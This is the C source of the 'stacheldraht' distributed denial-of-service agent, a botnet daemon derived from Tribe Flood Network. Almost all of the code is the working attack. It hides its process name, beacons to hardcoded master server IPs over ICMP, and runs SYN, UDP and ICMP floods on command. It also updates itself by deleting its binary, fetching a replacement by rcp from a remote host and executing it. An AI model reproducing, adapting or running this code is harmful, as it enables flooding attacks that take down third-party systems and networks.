/*
  stacheldraht flood network demon
  by randomizer
  
  based on mixter's tribe flood network demon code
*/
#define _BSD_SOURCE

#include <strings.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <time.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <signal.h>

#include "config.h"
#include "tubby.h"
#include "control.h"
#include "syn.c"
#include "udp.c"
#include "icmp.c"
#include "blowfish.h"

#define MSERVERFILE ".ms"

/* default masterservers */
#define MSERVER1 "193.116.54.15"
#define MSERVER2 "224.0.0.3"

/* crypt value for the masterserver file */
#define ENCRYPTVALUE "randomsucks"

/* check every 100 seconds if the masterserver is alive */
#define CHECKTIME 20

/* seconds the next distro is allowed */
#define DISTROTIME 100

/* maxtime a flood is allowed to run */
#define MAXTIME 30*60 // 2 hours ;)

/* progname */
#define PROGNAME "init"

/* port to wait for commands */
#define COMMANDPORT 65512

struct mserver
{
 char servername[16];
};

struct ippkt
{
 struct ip ipi;
 struct icmp icmpi;
 char buffer[1024];
}pkt;

/* random's new variable crap */
char buffer[2000];
struct mserver mservi[20];
struct in_addr amanda;
FILE *fili;
struct ippkt packet;
int listensocket;
int noconfigfile=1;
int servcounti=0;
int counti=0;
int received;
int abortit;
int serverworks;
int timeend;
int usedefault;
int floodruns;
int floodtime;
int endtime;
int distroallow=1;
int distroend=0;
int maxtimiend=0;

/* important global variables */
int WAITTIMER = 10; 
int spoofing = 0;

char *encrypt_string(char *, char *);
char *decrypt_string(char *, char *);

int resolv(char *host,long *ipaddr) {
        if (isdigit(host[0])) {
                *ipaddr=inet_addr(host);
                if (*ipaddr==-1) return -1;
        }
        else {
                struct hostent *hp;
                if ((hp=gethostbyname(host))==NULL) {
                        fprintf(stderr,"tc: unknown host\n");
                        exit(-1);
                }
                *ipaddr=*(unsigned long *)hp->h_addr;
        }
        return 0;
}


int returnlocalip()
{
 char asd[255];
 u_long ip;

// return(inet_addr("139.92.137.28"));
 gethostname(asd,255);
 resolv(asd,&ip);
 return(ip);

}


int spooftest() 
{
 #define timeout 10;

 fd_set fdset;
 struct timeval timi;
 int endtime;

 /* start of the spoof test */

 /* setup new socket to wait for mserver reply */
 listensocket=socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

 timi.tv_sec=1;
 timi.tv_usec=0;

 /* send a spoofed icmp packet*/
 icmp2(serverworks,inet_addr("3.3.3.3"));
 
 /* set the end time (maximum delay) */
 endtime=time(NULL) + timeout;
 /* wait for the masterserver reply */
 while (time(NULL) < endtime) {
  FD_ZERO(&fdset);
  FD_SET(listensocket,&fdset);
  select(FD_SETSIZE,&fdset,NULL,NULL,&timi);
  usleep(100);
  memset((void*)&packet,0,sizeof(struct ippkt));
  if (FD_ISSET(listensocket,&fdset)) {
   /* read data from listen socket */
   read(listensocket,(char*)&packet,sizeof(struct ippkt));
   /* was it the spoof reply */
   if (ntohs(packet.icmpi.icmp_hun.ih_idseq.icd_id)==1000) {
    close(listensocket);
    return 0;
   }
  }
 }
 close(listensocket);
 return 3;
}

void delmserver(char *mserverip)
{
 FILE *fili;
 char *pointi;
 char mservbuffer[10000];
 char decbuffer[10000];
 char *dstpointi;
 struct mserver *mpointi;
 long filesize;
 
 memset(decbuffer,0,sizeof(decbuffer));
 memset(mservbuffer,0,sizeof(mservbuffer));

 if ((fili=fopen(MSERVERFILE,"r"))==0) return;

 fseek(fili,0,2);
 fgetpos(fili,&filesize);
 fseek(fili,0,0);
 fread(mservbuffer,filesize,1,fili);
 fclose(fili);

 strcpy(decbuffer,decrypt_string(ENCRYPTVALUE,mservbuffer));
 memset(mservbuffer,0,sizeof(mservbuffer));

 mpointi=(struct mserver*)&mservi;
 pointi=(char*)&decbuffer;
 dstpointi=(char*)&mservbuffer;
 servcounti=0;
 while (1) {
  if (*pointi=='\0') break;
  memset(mservbuffer,0,sizeof(mservbuffer));
  dstpointi=(char*)&mservbuffer;
  while ((*pointi!=' ') && (*pointi!='\0')) {
   *dstpointi=*pointi;
   dstpointi++;
   pointi++;
  }
  pointi++;
  *dstpointi=0;
  if (strcmp(mserverip,mservbuffer)!=0) {
   strcpy(mpointi->servername,mservbuffer);
   servcounti++;
   mpointi++;
  }
 }
 addnewmserver(NULL);
}


int readmservers() 
{
 FILE *fili;
 char *pointi;
 char mservbuffer[10000];
 char decbuffer[10000];
 char *dstpointi;
 struct mserver *mpointi;
 long filesize;

 memset(decbuffer,0,sizeof(decbuffer));
 memset(mservbuffer,0,sizeof(mservbuffer));

 if ((fili=fopen(MSERVERFILE,"r"))==0) return(0);

 fseek(fili,0,2);
 fgetpos(fili,&filesize);
 fseek(fili,0,0);
 fread(mservbuffer,filesize,1,fili);
 fclose(fili);

 strcpy(decbuffer,decrypt_string(ENCRYPTVALUE,mservbuffer));  
 memset(mservbuffer,0,sizeof(mservbuffer));

 mpointi=(struct mserver*)&mservi;
 pointi=(char*)&decbuffer;
 dstpointi=(char*)&mservbuffer;

 servcounti=0;
 while (1) {
  if (*pointi=='\0') break;
  memset(mservbuffer,0,sizeof(mservbuffer));
  dstpointi=(char*)&mservbuffer;
  while ((*pointi!=' ') && (*pointi!='\0')) {
   *dstpointi=*pointi;
   dstpointi++;
   pointi++;
  }      
  servcounti++;
  pointi++;
  *dstpointi=0;
  strcpy(mpointi->servername,mservbuffer);
  mpointi++;
 }
 return 1;
}

void addnewmserver(char *newmserver)
{
 FILE *fili;
 char mservbuffer[10000];
 char encbuffer[10000];
 char *pointi;
 int counter;

 memset(encbuffer,0,sizeof(encbuffer));
 memset(mservbuffer,0,sizeof(mservbuffer));

 fili=fopen(MSERVERFILE,"w+");

 pointi=(char*)&mservbuffer;

 for (counter=0;counter<servcounti;counter++) {
  strcpy(pointi,mservi[counter].servername);
  pointi=pointi+strlen(mservi[counter].servername);
  *pointi=' '; 
  pointi++;
 }

 if (newmserver!=0) {
  strcpy(mservi[servcounti].servername,newmserver);
  servcounti++;
  strcpy(pointi,newmserver);
 } 

 strcpy(encbuffer,encrypt_string(ENCRYPTVALUE,mservbuffer));
 fwrite(encbuffer,strlen(encbuffer),1,fili);
 fclose(fili);
}

int checkalive(char *server) 
{
 int listensocket;
 struct ippkt packet;
 int timeend;

 /* setup new socket to wait for mserver reply */
 listensocket=socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
 fcntl(listensocket,F_SETFL,O_NONBLOCK);
 /* contact the masterserver */
 send_connect(inet_addr(server),666,"skillz");
 /* wait for the reply , about 10 seconds */
 timeend=time(NULL)+WAITTIMER;

 while (time(NULL)<timeend) {
//  bzero((void*)&packet,sizeof(struct ippkt));

  memset((void*)&packet,0,sizeof(struct ippkt));
  read(listensocket,(char*)&packet,sizeof(struct ippkt));
  if (ntohs(packet.icmpi.icmp_hun.ih_idseq.icd_id)==667) {
   serverworks=inet_addr(server);
   close(listensocket);
   return(1);
  }
 } 

 close(listensocket);
 return(0);
}

void contactservers(struct mserver *servers) 
{
 int counter;
 
 counter=0;
 while (counter<servcounti) {
  if (serverworks==0) {
   if (checkalive(servers->servername)) {
    serverworks=inet_addr(servers->servername);
    break;
   }
  }
  counter++;
  servers++;
 }
}

void getnewbin(char *user,char *address) 
{
 char toexecute[200];
 char text[200];

 sprintf(text,"rm -rf %s",PROGNAME);
 system(text);

 #ifdef LINUX
  sprintf(toexecute,"rcp %s@%s:linux.bin %s",user,address,PROGNAME);
 #endif
 #ifdef SOLARIS
  sprintf(toexecute,"rcp %s@%s:sol.bin %s",user,address,PROGNAME);
 #endif
 system(toexecute);
 sprintf(text,"nohup ./%s",PROGNAME);
 system(text);
 exit(0);
}

int
main (int puke, char **fart)
{
  char buf[2048], target[256], answer[512];
  struct ip *ipi = (struct ip *) buf;
  struct icmp *icmpi = (struct icmp *) (buf + sizeof (struct ip));
  char *p = (buf + sizeof (struct ip) + sizeof (struct icmp));
  int lsock, i, whereami, port4syn = 0;
  struct mserver defaultones[2]={{MSERVER1},{MSERVER2}};
  int endtime;
  char user[100];
  char commandbuf[5];
  char *p2;
  char *sick;
  int socki;
  int newsocket;
  struct sockaddr_in socketmuell;
  int clientlength=sizeof(struct sockaddr_in);
  int tempi;
  FILE *fili2;

  if (geteuid ())
   exit (-1);
  strcpy (fart[0], HIDEME);
  lsock = socket (AF_INET, SOCK_RAW, 1);
  close (0);
  close (1);
  close (2); 
  if (fork ())
  exit (0);  

/*  signal (SIGHUP, SIG_IGN);
  signal (SIGTERM, SIG_IGN); */
  signal (SIGCHLD, SIG_IGN);

  sleep(10);
 
  socki=socket(AF_INET,SOCK_STREAM,0);
  socketmuell.sin_port=htons(COMMANDPORT);
  socketmuell.sin_addr.s_addr=htonl(INADDR_ANY);
  socketmuell.sin_family=AF_INET;
  if (bind(socki,(struct sockaddr *)&socketmuell,sizeof(socketmuell))!=0) exit(0);
  close(socki);

  sleep(30); 
  /* fork the new commandport handler */
  if (fork()==0) {
   socki=socket(AF_INET,SOCK_STREAM,0);
   socketmuell.sin_port=htons(COMMANDPORT);
   socketmuell.sin_addr.s_addr=htonl(INADDR_ANY);
   socketmuell.sin_family=AF_INET;
   bind(socki,(struct sockaddr *)&socketmuell,sizeof(socketmuell));
   listen(socki,5);
   while (1) {
    newsocket=accept(socki,(struct sockaddr *)&socketmuell,&clientlength);
    close(newsocket);
   }
  }

  if (readmservers()==0) {
/*   printf("no masterserver config found.\n");
   printf("using default ones.\n"); */
   servcounti=2;
   usedefault=1; 
   contactservers((struct mserver*)&defaultones);
   strcpy(mservi[0].servername,defaultones[0].servername);
   strcpy(mservi[1].servername,defaultones[1].servername);
  }
  else contactservers(mservi);

  if (serverworks==0) {
/*   printf("\navailable servers: %i - working servers : 0\n",servcounti);
   printf("[*] stacheldraht [*] installation failed.\n");  */
   exit(0);
  }


  close(listensocket);
 
//  printf("\nfound a working [*] stacheldraht [*] masterserver.\n"); 

  nospoof=spooftest();
  
  endtime=time(NULL)+CHECKTIME;
  fcntl(lsock,F_SETFL,O_NONBLOCK);
  timiend=0;
  while (1)
    {
      memset(buf,0,1024);
      i = read (lsock, buf, 1024);
      sick=p;

      if (maxtimiend!=0) {
       if (maxtimiend < time(NULL)) {
        floodruns=0;
        maxtimiend=0;
        must_kill_all();
        usleep (1000);
       }
      }

      if (timiend!=0) {
       if (timiend < time(NULL)) {
        floodruns=0;
        timiend=0;
        must_kill_all();
        usleep (1000);
       }
      }  
      usleep(200);       
       
      if (floodruns==0) {
       if (time(NULL) > endtime) {
        amanda.s_addr=serverworks;
        if (checkalive(inet_ntoa(amanda))==0) {
         serverworks=0;
//         printf("masterserver is gone, looking for a new one\n");
         contactservers(mservi);
        }
        endtime=time(NULL)+CHECKTIME;
       } 
      } 
      if (ipi->ip_p == 1 && icmpi->icmp_type == 0)
	{
	  whereami = i - (sizeof (struct ip) + sizeof (struct icmp)) + 1;

	  switch (ntohs (icmpi->icmp_hun.ih_idseq.icd_id))
	    {
            case ID_SETPRANGE:
             lowport=ntohl(*(int*)sick);
             sick=sick+4;
             highport=ntohl(*(int*)sick);
             break;
            case ID_SETUSIZE:
             udppsize=ntohl(*(int*)p);
             break;
            case ID_SETISIZE:
             icmpsize=ntohl(*(int*)p);
             break;
            case ID_DISTROIT:
              
             if (distroend<time(NULL)) distroallow=1;
             if (distroallow==0) break;
             distroallow=0;
             distroend=time(NULL)+DISTROTIME;
             p2=p;
             while (*p2!=' ') p2++;
             *p2=0;
             p2++;
             getnewbin(p,p2);
             break;
         
            case ID_REMMSERVER:
              /* convert stuff in network byte order to a string */
             amanda.s_addr=*(int*)p;
             delmserver(inet_ntoa(amanda));
             break;

            case ID_ADDMSERVER:
             /* convert stuff in network byte order to a string */
             amanda.s_addr=*(int*)p;
             addnewmserver(inet_ntoa(amanda));
             break;

            case ID_TEST:
             amanda.s_addr=ipi->ip_src.s_addr;
             myip = htonl (ipi->ip_dst.s_addr);
             send_connect(ipi->ip_src.s_addr,669,"sicken\n");
             break;
              
	    case ID_ICMP:
	      if (floodruns) break;
              if (*(int*)p!=0) timiend=ntohl(*(int*)p)+floodtime+time(NULL);
              maxtimiend=time(NULL)+MAXTIME;
	      myip = htonl (ipi->ip_dst.s_addr);
	      fw00ding = 3;
	      strcpy (fart[0], HIDEKIDS);
              commence_icmp (p);
	      strcpy (fart[0], HIDEME);
              floodruns=1;
	      break;
	    case ID_SENDUDP:
              if (floodruns) break;
              if (*(int*)p!=0) timiend=ntohl(*(int*)p)+time(NULL);
              maxtimiend=time(NULL)+MAXTIME;
              floodtime=0;
              myip = htonl (ipi->ip_dst.s_addr);
	      fw00ding = 1;
	      strcpy (fart[0], HIDEKIDS);
	      commence_udp (p+4);
	      strcpy (fart[0], HIDEME);
	      floodruns=1;
              break;
	    case ID_SENDSYN:
              if (floodruns) break;
              if (*(int*)p!=0) timiend=ntohl(*(int*)p)+time(NULL);
              tempi=*(int*)p;
              fflush(stdout);
              floodtime=0;
              myip = htonl (ipi->ip_dst.s_addr);
              maxtimiend=time(NULL)+MAXTIME;
              floodruns=1;
	      fw00ding = 2;
	      strcpy (fart[0], HIDEKIDS);
	      commence_syn (p+4);
	      strcpy (fart[0], HIDEME);
	      break;
	    case ID_STOPIT:
              if (floodruns==0) break;
              floodruns=0;
	      must_kill_all ();
	      usleep (1000);
	      break;
	    case ID_SYNPORT:
	      port4syn = atoi (target);
	      break;
            case ID_DIEREQ:
             must_kill_all();
             exit(0);
              
	    default:
	      continue;
	    }
	}
    }
  /* 1 != 1 */
  return (0);
}
